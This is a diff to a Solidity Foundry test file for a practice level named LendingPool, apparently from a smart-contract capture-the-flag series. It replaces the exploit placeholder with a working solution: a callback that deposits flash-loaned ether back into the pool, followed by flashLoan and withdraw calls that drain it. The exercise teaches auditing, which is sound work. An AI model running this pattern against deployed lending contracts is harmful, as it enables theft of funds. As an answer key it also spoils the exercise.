@@ -2,7 +2,7 @@
 pragma solidity ^0.8.25;
 
 import "./BaseTest.t.sol";
-import "src/08_LendingPool/LendingPool.sol";
+import "../src/08_LendingPool/LendingPool.sol";
 
 // forge test --match-contract LendingPoolTest -vvvv
 contract LendingPoolTest is BaseTest {
@@ -13,8 +13,13 @@ contract LendingPoolTest is BaseTest {
         instance = new LendingPool{value: 0.1 ether}();
     }
 
+    function execute() external payable {
+        instance.deposit{value: msg.value}();
+    }
+
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        instance.flashLoan(0.1 ether);
+        instance.withdraw();
 
         checkSuccess();
     }
